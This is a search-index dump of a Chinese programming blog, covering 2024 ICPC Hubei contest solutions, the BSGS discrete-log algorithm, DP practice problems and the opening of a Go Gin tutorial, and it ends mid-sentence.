[{"categories":null,"content":"瞻鹤's friends","date":"2024-06-11","objectID":"/friends/","tags":null,"title":"友链","uri":"/friends/"},{"categories":null,"content":"Base info\r- nickname: Lruihao avatar: https://lruihao.cn/images/avatar.jpg url: https://lruihao.cn description: Lruihao's Note","date":"2024-06-11","objectID":"/friends/:1:0","tags":null,"title":"友链","uri":"/friends/"},{"categories":null,"content":"Friendly Reminder\rNotice\rIf you want to exchange link, please leave a comment in the above format. (personal non-commercial blogs / websites only)  Website failure, stop maintenance and improper content may be unlinked! Those websites that do not respect other people’s labor achievements, reprint without source, or malicious acts, please do not come to exchange. ","date":"2024-06-11","objectID":"/friends/:2:0","tags":null,"title":"友链","uri":"/friends/"},{"categories":["ICPC"],"content":"2024年ICPC湖北省赛\rDashboard - The 2024 International Collegiate Programming Contest in Hubei Province, China - Codeforces ","date":"2024-06-11","objectID":"/posts/583bc6c/:0:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - A - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:1:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r固定a为1，则b=lcm / gcd ","date":"2024-06-11","objectID":"/posts/583bc6c/:1:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rll gcd(ll a, ll b){ return b? gcd(b, a % b):a; } void solve(){ ll x, y; cin \u003e\u003e x \u003e\u003e y; ll gc = gcd(x, y); ll lc = x * y / gc; ll d = lc / gc; cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c d \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:1:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - B - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:2:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r找最小面积的多边形，即面积最小的三角形。 海伦公式精度会WA，使用向量叉积求三角形面积即可（叉积为0时向量共线，continue） ","date":"2024-06-11","objectID":"/posts/583bc6c/:2:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rstruct point{ double x, y; point(){} point(double x, double y): x(x), y(y){} point operator + (point b){return point(x + b.x, y + b.y);}; point operator - (point b){return point(x - b.x, y - b.y);}; }f[110]; typedef point Vector; double cross(Vector a, Vector b){return a.x*b.y - a.y*b.x;} double area2(point a, point b, point c){ return cross(b -a , c-a); } void solve(){ int n; cin \u003e\u003e n; double ans = 1e18; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e f[i].x \u003e\u003e f[i].y; } int flag = 0; for(int i = 1; i \u003c= n - 2; i++) for(int j = i + 1; j \u003c= n - 1; j++) for(int k = j + 1; k \u003c= n; k++){ double tmp = fabs(area2(f[i], f[j], f[k]) / 2.0); //cout \u003c\u003c tmp \u003c\u003c '\\n'; if(tmp == 0) continue; flag = 1; ans = min(ans, tmp); } if(!flag){ printf(\"-1\\n\"); return; } printf(\"%.7lf\\n\", ans); }","date":"2024-06-11","objectID":"/posts/583bc6c/:2:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - E - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:3:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rvoid solve(){ ll n, x, a, b; cin \u003e\u003e n \u003e\u003e x \u003e\u003e a \u003e\u003e b; cout \u003c\u003c (n - x) * a + x * b \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:3:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - G - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:4:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r考虑到棋盘为19*19，每次落子检查最多5个连通块（落子的上下左右+自己），bfs暴力搜索气为0的连通块，暴力取子。 注意题目中的去子顺序。 ","date":"2024-06-11","objectID":"/posts/583bc6c/:4:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rint mp[22][22]; int st[22][22]; int dx[] = {-1,1,0,0, 0}; int dy[] = {0,0,-1,1,0}; void solve(){ int m; scanf(\"%d\", \u0026m); int flag = 1; //1 black 2 w; while(m--){ for(int i = 1; i \u003c= 19; i++) for(int j = 1; j \u003c= 19; j++) st[i][j] = 0; int x, y; scanf(\"%d%d\", \u0026x, \u0026y); mp[x][y] = flag; int cntb = 0, cntw = 0; for(int u = 0; u \u003c 5; u++){ int i = x + dx[u], j = y + dy[u]; if(mp[i][j] != 0 \u0026\u0026 !st[i][j]){ if(mp[i][j] == flag) continue;//先检查不同颜色。 int life = 0; queue\u003cpair\u003cint, int\u003e\u003e que; que.push({i, j}); vector\u003cpair\u003cint,int\u003e\u003e pos; st[i][j] = true; while(que.size()){ auto tmp = que.front(); que.pop(); pos.push_back(tmp); for(int q = 0; q \u003c 4; q++){ int a = tmp.first + dx[q], b = tmp.second + dy[q]; if(a \u003c 1 || a \u003e 19 || b \u003c 1 || b \u003e 19 || st[a][b]) continue; if(mp[a][b] == 3 - mp[i][j]) continue; if(mp[a][b] == 0) {life++;continue;}; st[a][b] = true; que.push({a,b}); } } if(life == 0){ if(mp[i][j] == 1) cntb += pos.size(); else cntw += pos.size(); for(auto [a,b]:pos){ mp[a][b] = 0; } } } } for(int i = 1; i \u003c= 19; i++) for(int j = 1; j \u003c= 19; j++) st[i][j] = 0; for(int u = 0; u \u003c 5; u++){//要检查落下的这颗棋子的位置 int i = x + dx[u], j = y + dy[u]; if(mp[i][j] != 0 \u0026\u0026 !st[i][j]){ if(mp[i][j] == 3 - flag) continue;//再检查相同颜色 int life = 0; queue\u003cpair\u003cint, int\u003e\u003e que; que.push({i, j}); vector\u003cpair\u003cint,int\u003e\u003e pos; st[i][j] = true; while(que.size()){ auto tmp = que.front(); que.pop(); pos.push_back(tmp); for(int q = 0; q \u003c 4; q++){ int a = tmp.first + dx[q], b = tmp.second + dy[q]; if(a \u003c 1 || a \u003e 19 || b \u003c 1 || b \u003e 19 || st[a][b]) continue; if(mp[a][b] == 3 - mp[i][j]) continue; if(mp[a][b] == 0) {life++;continue;}; st[a][b] = true; que.push({a,b}); } } if(life == 0){ if(mp[i][j] == 1) cntb += pos.size(); else cntw += pos.size(); for(auto [a,b]:pos){ mp[a][b] = 0; } } } } printf(\"%d %d\\n\", cntb, cntw); flag = 3 - flag; } }","date":"2024-06-11","objectID":"/posts/583bc6c/:4:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - H - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:5:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路：\r用十位四进制数表示鱼塘中剩下的鱼，每一位是一个块内剩下的鱼，将(sum)4 变为(0)4。 枚举5*k个位置投放i枚炸弹后的状态转移 在i,j位置放x枚炸弹，使得五个位置中减少的鱼的数量的状态位四进制数(x)4 枚举当前所有的状态，对每一个状态和这个四进制数进行check，每一个四进制位取两者的最小值（能够改变的状态）得到一个新的四进制数tmp，并记录实际有效的炸弹数量cnt，则状态转移方程为dp[key - tmp] = min(dp[key - tmp], dp[key] + cnt); 最后答案即为dp[0] ","date":"2024-06-11","objectID":"/posts/583bc6c/:5:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"code:\r#include \u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll mp[1010][1010]; ll dx[] = {0, 0,1,0,-1}; ll dy[] = {0,1,0,-1,0}; ll pos[1010][1010]; ll st[1010][1010]; ll idx = 0; ll dp[2000010]; ll pow4[20]; ll num = 0; ll check(ll a, ll b){ ll res = 0; num = 0; ll cnt = 0; while(b){ ll f1 = a % 4; ll f2 = b % 4; res += pow4[cnt] * min(f1, f2); num = max(num, min(f1, f2));//实际生效的炸弹数量 b /= 4; a /= 4; cnt++; } return res; //a状态-res后转移到新状态 } void solve(){ set\u003cll\u003e all; ll n, m, k; scanf(\"%lld%lld%lld\", \u0026n, \u0026m, \u0026k); ll mx = 0; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++) pos[i][j] = -1; vector\u003cpair\u003cint, int\u003e\u003e f; for(int i = 1; i \u003c= k; i++){ ll x, y, a; scanf(\"%lld%lld%lld\", \u0026x, \u0026y, \u0026a); mp[x][y] = a; mx += pow4[idx] * a; pos[x][y] = idx++;//每一个有鱼的块对于四进制数中的一位 for(int q = 0; q \u003c 5; q++){ ll xx = x + dx[q], yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; f.push_back({xx,yy}); } } for(int i = 0; i \u003c= mx; ++i) dp[i] = 0x3f; dp[mx] = 0; all.insert(mx); for(auto [x,y]:f){//枚举每一个可以投掷炸弹的位置 if(st[x][y]) continue;//重叠的区域 st[x][y] = 1; for(ll i = 1; i \u003c= 3; i++){ ll boom = 0; for(ll q = 0; q \u003c 5; q++){ ll xx = x + dx[q]; ll yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; if(pos[xx][yy] \u003e -1){ boom += pow4[pos[xx][yy]] * i; } } for(auto key:all){//枚举所有状态 ll tmp1 = check(key, boom); if(tmp1 \u003e key) continue; dp[key - tmp1] = min(dp[key - tmp1], dp[key] + num); all.insert(key - tmp1);//添加新状态 } } } printf(\"%lld\\n\", dp[0]); } int main() { pow4[0] = 1; for(int i = 1; i \u003c= 11; i++){ pow4[i] = pow4[i - 1] * 4;//4的幂次 } int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/583bc6c/:5:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - J - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:6:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路：\r结论题：ans = sum / n ","date":"2024-06-11","objectID":"/posts/583bc6c/:6:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code：\rconst int mod = 998244353; ll a[1000010]; ll ksm(ll a, ll b){ ll ans = 1; while(b){ if(b \u0026 1) ans = (ans * a)% mod; a = (a * a) % mod; b \u003e\u003e= 1; } return ans; } void solve(){ int n; cin \u003e\u003e n; ll tmp = 0; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; if(n == 1){ cout \u003c\u003c a[1]; return; } for(int i = 1; i \u003c= n; i++) tmp = (tmp + a[i]) % mod; cout \u003c\u003c (tmp * ksm(n, mod - 2) )% mod; }","date":"2024-06-11","objectID":"/posts/583bc6c/:6:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - L - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:7:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\rdist(a, b)表示从a到b的cost（规定a \u003c b）： 两个都是质数时：min(a * b, 2 * (a + b)) a == b时： 0 b % a == 0：b gcd（a, b) \u003e 1时：a+b gcd == 1 一个复数：质数到复数的最小质因子p，再从最小质因子到复数 dist(a, p) + dist(b, p); 两个复数：分别用两数的最小质因子，取min. min(dist(a, p1) + dist(b,p1), dist(a,p2) + dist(b,p2)); ","date":"2024-06-11","objectID":"/posts/583bc6c/:7:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rmap\u003cpair\u003cll,ll\u003e, ll\u003e mp; ll dist(ll a, ll b){ if(a == b) return 0; if(a \u003e b) swap(a, b); if(mp.find({a,b}) != mp.end()) return mp[{a,b}]; if(b % a == 0) { mp[{a,b}] = b; return b; } ll g = gcd(a, b); if(g \u003e 1) { mp[{a,b}] = a + b; return a + b; } ll x = get(a), y = get(b); if(x == a \u0026\u0026 y == b) { mp[{a,b}] = min(a * b, 2LL * (a + b)); return mp[{a, b}]; } else{ if(x == a){ mp[{a, b}] = dist(a, y) + dist(y, b); return mp[{a, b}]; }else if(y == b){ mp[{a, b}] = dist(a, x) + dist(b, x); return mp[{a, b}]; }else{ ll d1 = dist(a, y) + dist(y, b); ll d2 = dist(b, x) + dist(x, a); mp[{a, b}] = min(d1, d2); return mp[{a, b}]; } } } void solve(){ ll a, b; cin \u003e\u003e a \u003e\u003e b; cout \u003c\u003c dist(a, b) \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:7:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["算法和数据结构"],"content":"BSGS\r2023-08-17 | 算法 | 2 reads 字数:559 BSGS算法(BABY-STEP GIANT-STEP)，又称大步小步法，通常用于求解高阶线性同余方程如：ax ≡ b (mod p)𝑎𝑥 ≡ 𝑏 (𝑚𝑜𝑑 𝑝)。根据p是否为质数，有扩展BSGS算法和BSGS算法。 BSGS通过欧拉定理及其拓展确定x的范围，再通过暴力枚举求解x。其本质是分块思想。 欧拉定理： 具体内容： aφ(m) ≡ 1( mod m)𝑎φ(𝑚) ≡ 1( 𝑚𝑜𝑑 𝑚) 。 其中 φ(m)φ(𝑚) 是 m 的欧拉函数，当m为质数p时，欧拉定理退化为费马小定理：a(p−1) ≡ 1( mod p)𝑎(𝑝−1) ≡ 1( 𝑚𝑜𝑑 𝑝)。(质数p的欧拉函数=p-1) 重要推论：当a与m互质时，有ab = ab mod φ(m)𝑎𝑏 = 𝑎𝑏 𝑚𝑜𝑑 φ(𝑚),利用这个推论，即使b比较大，也能轻松计算ab mod m𝑎𝑏 𝑚𝑜𝑑 𝑚的值 当a与m不互质时，采用拓展欧拉定理：若b ≥ φ(m)𝑏 ≥ φ(𝑚),则ab ≡ ab mod φ(m) + φ(m) (mod m)𝑎𝑏 ≡ 𝑎𝑏 𝑚𝑜𝑑 φ(𝑚) + φ(𝑚) (𝑚𝑜𝑑 𝑚),b \u003c φ(m)𝑏 \u003c φ(𝑚)时直接用快速幂计算 求解ax ≡ b (mod p)𝑎𝑥 ≡ 𝑏 (𝑚𝑜𝑑 𝑝)问题，当P为质数时， 由欧拉定理的推论可知ab = ab mod φ(p) (mod p)𝑎𝑏 = 𝑎𝑏 𝑚𝑜𝑑 φ(𝑝) (𝑚𝑜𝑑 𝑝)，ax𝑎𝑥在模P意义下的最小循环节为φ(p)φ(𝑝),因为p为质数所以φ(p) ＝ p−1φ(𝑝) ＝ 𝑝−1,故在[0,p][0,𝑝]之间，必能找到最小整数x。 采取暴力枚举的方法求p： 假设x = im - j,则有aim ≡ b∗aj ( mod p)𝑎𝑖𝑚 ≡ 𝑏∗𝑎𝑗 ( 𝑚𝑜𝑑 𝑝),其中m = ceil(sqrt(p))为根号P向上取整,这时只需要直接枚举左右两边的情况; 我们可以采用哈希表存储 枚举右边时，当键b∗aj𝑏∗𝑎𝑗重复出现时，令对应的值等于较大的j； 由于要求最小非负解x，则令i从1开始枚举，当aim𝑎𝑖𝑚的值在哈希表中重复出现时，说明找了到了解，并且这个解是满足条件的最小非负解，因为保证了i尽可能小，j尽可能大。 把区间分为√p𝑝块,每块长√p𝑝,根据i的值im分别对应了√p𝑝个小区间，i递增即检查每个小区间内有没有符合条件的解。i的一小步，在区间上跨越了一大步，所以叫做 BABY-STEP GIANT-STEP算法。其本质是分块思想。 typedef long long ll; ll fpow(ll a, ll b, ll p) { ll res = 1; while (b) { if (b \u0026 1) res = res * a % p; a = a * a % p; b \u003e\u003e= 1; } return res; } ll bsgs(ll a, ll b, ll p) { a %= p, b %= p; if(a == 0) return b == 0 ? 1 : -1; if(b == 1) return 0; ll m = ceil(sqrt(p)), inv = fpow(a, m, p); unordered_map\u003cll, ll\u003e mp; mp[b] = 0; ll tmp = inv; for (int i = 1, e = b; i \u003c m; i++) { e = e * a % p; mp[e] = i; } for (int i = 1; i \u003c= m; i++) { if (mp.find(inv) != mp.end()) { return i * m - mp[inv]; } inv = inv * tmp % p; } return -1; }当p为非质数时，使用扩展BSGS算法 typedef long long ll; ll fpow(ll a, ll b, ll p)//求快速幂 { ll res = 1; while (b) { if (b \u0026 1) res = res * a % p; a = a * a % p; b \u003e\u003e= 1; } return res; } ll bsgs(ll a, ll b, ll p)//bsgs { a %= p, b %= p; if (a == 0) return b == 0 ? 1 : -1; if (b == 1) return 0; ll m = ceil(sqrt(p)), t = fpow(a, m, p); unordered_map\u003cll, ll\u003e mp; mp[b] = 0; ll tmp = t; for (int i = 1, e = b; i \u003c m; i++) { e = e * a % p; mp[e] = i; } for (int i = 1; i \u003c= m; i++) { if (mp.find(t) != mp.end()) { return (i * m - mp[t] + p) % p; } t = t * tmp % p; } return -1; } ll gcd(ll a, ll b)//欧几里得 { return b ? gcd(b, a % b) : a; } ll exgcd(ll a, ll b, ll\u0026 x, ll\u0026 y)//扩欧求逆元 { if (b == 0) { x = 1, y = 0; return a; } ll d = exgcd(b, a % b, y, x); y -= a / b * x; return d; } ll inv(ll a, ll b)求逆元 { ll x, y; exgcd(a, b, x, y); return (x % b + b) % b; } ll exbsgs(ll a, ll b, ll p)//扩展bsgs { if (b == 1 || p == 1)return 0; ll g = gcd(a, p), k = 0, na = 1; while (g \u003e 1) { if (b % g != 0)return -1; k++; b /= g; p /= g; na = na * (a / g) % p; if (na == b)return k; g = gcd(a, p); } ll f = bsgs(a, b * inv(na, p) % p, p); if (f == -1)return -1; return f + k; }","date":"2024-06-11","objectID":"/posts/bsgs/:0:0","tags":["算法"],"title":"BSGS","uri":"/posts/bsgs/"},{"categories":["算法和数据结构"],"content":"DP\r","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:1:0","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["算法和数据结构"],"content":"洛谷P1541\r[P1095 NOIP2007 普及组] 守望者的逃离 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) [P1541 NOIP2010 提高组] 乌龟棋 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 首先考虑状态，在出第i张牌时，值只和dp[i - 1]有关，但有四种情况，同时需要知道当前能获取的价值（走到了哪里）。如果能记录下先前都出了什么牌以及获得的总价值，就能解决这个问题。由于有四类牌，设一个四维数组dp[a][b][c][d],表示出了a张1，b张2，c张3，d张4，dp[0][0][0][0]=val[0],那么当前获取的价值就是val[1 + a + b * 2 + c * 3 + d * 4]; 对于状态转移：当出一张1时，显然有dp[a][b][c][d] = max（dp[a][b][c][d]， dp[a - 1][b][c][d] + val[1 + a + b * 2 + c * 3 + d * 4]）,以此类推当出其他牌时同理。 那么四重循环枚举每类牌的个数即可（每类牌不超过40) #include \u003cbits/stdc++.h\u003e #define fi first; #define se second; using namespace std; typedef long long ll; typedef long double ld; typedef pair\u003cint, int\u003e pii; // 1.integer overflow (1e5 * 1e5) (2e9 + 2e9) // 2.runtime error // 3.boundary condition int f[400]; int g[5]; int dp[41][41][41][41]; int ans = 0; int n, m; void solve() { cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i++) cin \u003e\u003e f[i]; for (int i = 0; i \u003c m; i++) { int tmp; cin \u003e\u003e tmp; g[tmp]++; } dp[0][0][0][0] = f[1]; for (int a = 0; a \u003c= g[1]; a++) for (int b = 0; b \u003c= g[2]; b++) for (int c = 0; c \u003c= g[3]; c++) for (int d = 0; d \u003c= g[4]; d++) { int r = a + 2 * b + 3 * c + 4 * d + 1; if (a != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a - 1][b][c][d] + f[r]); if (b != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b - 1][c][d] + f[r]); if (c != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b][c - 1][d] + f[r]); if (d != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b][c][d - 1] + f[r]); } cout \u003c\u003c dp[g[1]][g[2]][g[3]][g[4]]; } int main() { ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while (t--) { solve(); } return 0; }P1868 饥饿的奶牛 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 以区间为单位进行考虑的话，每个区间只有取和不取两种状态。将所有区间按右端点排序后，用dp[i]表示从最左端到第i个区间右端点内可以取的价值的最大值，dp[i] = max(i.r - i.l + 1 + dp[j], dp[i - 1]) 当考虑第i个区间时，只需要将它的贡献与往前数第一个不相交的区间的dp[j]加起来与dp[i - 1]做比较即可。先预处理将所有区间的右端点存储，再用二分查找优化一下找不相交区间即可。 #include \u003calgorithm\u003e #include \u003cbits/stdc++.h\u003e #include \u003cvector\u003e #define fi first; #define se second; using namespace std; typedef long long ll; typedef long double ld; typedef pair\u003cint, int\u003e pii; vector\u003cint\u003e t; //1.integer overflow (1e5 * 1e5) (2e9 + 2e9) //2.runtime error //3.boundary condition const int N = 150010; struct tmp{ int l, r; }g[N]; int dp[N]; bool cmp(struct tmp a, struct tmp b){ if(a.r == b.r) return a.l \u003c b.l; return a.r \u003c b.r; } void solve(){ int n; cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e g[i].l \u003e\u003e g[i].r; } sort(g + 1, g + 1 + n, cmp); t.push_back(0); for(int i = 1; i \u003c= n; i++) t.push_back(g[i].r); dp[0] = 0; for(int i = 1; i \u003c= n; i++){ int val = g[i].r - g[i].l + 1; int pos = lower_bound(t.begin(), t.end(), g[i].l) - t.begin(); pos--; dp[i] = val + dp[pos]; dp[i] = max(dp[i], dp[i - 1]); } // for(int i = 1; i \u003c= n; i++) // cout \u003c\u003c dp[i] \u003c\u003c ' '; // cout \u003c\u003c '\\n'; cout \u003c\u003c dp[n]; } int main() { ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }[P2679 NOIP2015 提高组] 子串 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 字符串匹配类型的DP xxxxxxxxxx class Solution {public: vector rangeAddQueries(int n, vector\u0026 queries) { vector tmp(n+1 , vector(n+1,0)); int m = queries.size(); for(int i = 0; i \u003c m; i++) { tmp[queries[i][0]][queries[i][1]]++; tmp[queries[i][0]][queries[i][3]+1]–; tmp[queries[i][2]+1][queries[i][1]]–; tmp[queries[i][2]+1][queries[i][3]+1]++; }//对差分数组进行操作 vector ans(n , vector(n , 0)); ans[0][0] = tmp[0][0]; for(int i = 0; i \u003c n; ++i) for(int j = 1; j \u003c n; ++j) tmp[i][j] += tmp[i][j-1]; for(int i = 1; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) tmp[i][j] += tmp[i-1][j]; for(int i = 0; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) ans[i][j] = tmp[i][j]; //由于下标从0开始，所以分布求前缀和要方便一点 //这种写法不存在重复加的地方，第一个for求一维前缀和，第二个for加上前面行的和。 return ans; }}; c++ 本题是dp[i][j][k][0\\1]表示A字符串前i个、中选了k个子串匹配到B字符串前j个的方案数，因为要求不相交的子串需要知道某个字符有没有被选中，所以用第四维表示第i个字符有没有被选中。 状态转移： 显然第i个字符如果被选中那么只有2种可能：1.作为前面被选中的子串的末尾、2.作为新子串的开头 如果第i个字符被选中，那么显然A[i] = B[j] 或者A[i] != B[j] (这时方案为0)； 所以当A[i] == B[j] 时有第一类转移方程 不选:dp[i][j][k][0] = dp[i - 1][j][k][1] + dp[i - 1][j][k][0] 选:dp[i][j][k][1] = dp[i - 1][j - 1][k][1] + dp[i - 1][j - 1][k - 1]","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:1:1","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["算法和数据结构"],"content":"字符串\r给出两个字符串，比较由两个字符串重复构成的无限长字符串的字典序。 若字符串A+B \u003c B + A, 则A \u003c B 反之同理 #include\u003ciostream\u003e #include\u003calgorithm\u003e #include\u003ccstring\u003e using namespace std; int main(){ string a, b; while(cin \u003e\u003e a \u003e\u003e b){ string c = a + b; string d = b + a; if(c \u003e d) puts(\"\u003e\"); else if(c \u003c d) puts(\"\u003c\"); else puts(\"=\"); } return 0; }","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:2:0","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["工程"],"content":"Gin框架介绍\rGin 是一个用 Go (Golang) 编写的 HTTP Web 框架。 它具有类似 Martini 的 API，但性能比 Martini 快 40 倍。如果你需要极好的性能，使用 Gin 吧。","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:1:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Gin框架安装\r要求：Go 1.13及以上版本 安装 下载并安装gin： go get -u github.com/gin-gonic/gin 在项目中引入gin： import \"github.com/gin-gonic/gin\"有时候需要使用诸如http.StatusOK之类的常量，则需要引入net/http包： import \"net/http\"","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:1:1","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Gin框架的简单使用\rpackage main import \"github.com/gin-gonic/gin\" func main(){ router := gin.Default() router.GET(\"/ping\", func(context *gin.Context) { context.JSON(200, gin.H{\"message\": \"pong\",}) }) router.Run(\":8080\") // 监听并在 0.0.0.0:8080 上启动服务 }上述代码运行后访问https://localhost:8080/ping可以看到一个json格式的数据,{“message”:“pong”}说明代码运行成功了。 首先使用gin.Default()函数生成一个路由引擎，这个路由引擎会默认使用两个全局中间件gin.Logger()和gin.Recovery()，生成的类型为*gin.Engine的变量router是Gin框架的基础。 gin.Logger()//Logger 中间件将日志写入 gin.DefaultWriter gin.Recovery()//Recovery 中间件会 recover 任何 panic。如果有 panic 的话，会写入 500 如果想生成一个没有默认中间件的路由引擎则使用函数gin.New() router := gin.New()然后注册路由，上述代码为匿名函数的写法，以下展示注册路由和自定义函数的写法： --- router.GET(\"/path/to\", func(context *gin.Context)){函数内容}) //Get方法 router.POST(\"/path/to\", func(context *gin.Context)){函数内容}) //post方法 --- 自定义路由的方法 func helloword(context *gin.Context){ context.JSON(200, gin.H{\"message\": \"hello world\",}) } router.GET(\"/path/to\", helloword) router.POST(\"/path/to\", helloword) --- 当需要注册的路由太多时，可以采用注册路由组的方法： test := router.Group(\"/video\") { test.GET(\"/1\", func(c *gin.Context) {//访问/video/1以此类推 c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/2\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/3\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/4\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) }","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:2:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"从URL获得参数\r从url获得参数有GET和POST两种方法，具体区别见http请求中get和post方法的区别 - 知乎 (zhihu.com)，下面用代码展示两种方法的使用: 通过上下文对象c *gin.Context的方法获得值 //GET方法： //URL /path?id=1234\u0026name=Manu\u0026value= //GET方法使用Query获得值，Query(key string) (value string) c.Query(\"id\") == \"1234\" c.Query(\"name\") == \"Manu\" c.Query(\"value\") == \"\" c.Query(\"wtf\") == \"\" //也可以使用DefaultQuery(key string, defaultValue string) string 如果值为空则返回defaultValue的值 //QueryArray(key string) (values []string) //QueryMap(key string) (dicts map[string]string) --- //POST方法 name := c.PostForm(\"name\") price := c.DefaultPostForm(\"price\", \"100\") //c.PostForm(key string)(value string) //同样有GET类似的方法，参数和返回值一样 可以通过参数绑定获取参数 参数绑定利用反射机制，自动提取querystring，form表单，json，xml等参数到结构体中，可以极大提升开发效率。 type Teacher struct { Name string `form:\"Name\" json:\"Name\" binding:\"required\"` Email string `form:\"Email\" json:\"Email\" binding:\"required\"` Wechat string `form:\"Wechat\" json:\"Wechat\" binding:\"required\"` id int `form:\"id\" json:\"id\" binding:\"-\"` } //在变量后面加上 `form:\"Name\" json:\"Name\" binding:\"required\"`， form为表单， 